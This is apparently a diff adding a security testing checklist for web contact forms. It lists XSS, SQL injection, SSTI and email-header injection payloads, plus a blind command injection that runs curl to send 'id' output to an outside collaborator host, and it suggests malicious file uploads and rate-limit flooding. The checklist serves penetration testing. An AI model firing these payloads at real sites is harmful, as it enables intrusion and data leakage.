@@ -1,0 +1,27 @@
+Contact Form Security Testing Checklist
+
+1. Input Validation & Injection
+— XSS (stored/reflected) : <script>alert(1)</script>. 
+— Blind XSS : https://bxsshunter.com/
+— DOM-based XSS : "><img src=x onerror=alert(1)>
+— SQL Injection : ' OR '1'='1 in Email
+— SQL Injection (blind) : ' OR IF(SLEEP(5),1,0)-- 
+— Command Injection : ; ls
+— Command Injection (Blind) : ; curl https://your-burp-collaborator.com/$(id) inPhone
+— SSTI :  {{7*7}} ${7*7}
+
+2. Business Logic Flaws
+Mandatory Field Bypass : Send request without Email or Phone
+Spam / Rate Limiting : Send 1000+ requests with same input
+Duplicate Lead Generation : Submit same data repeatedly
+
+3. Information Disclosure
+Verbose Error Handling : Break email format (test@@mail..com
+Email Injection : attacker@mail.com\r\nBCC:evil@mail.com in Email
+
+5. File Upload (if any hidden upload option)
+— Maliciousupload : php, .jsp, .aspx 
+
+6.  CORS Misconfig :  Add origin header 
+
+
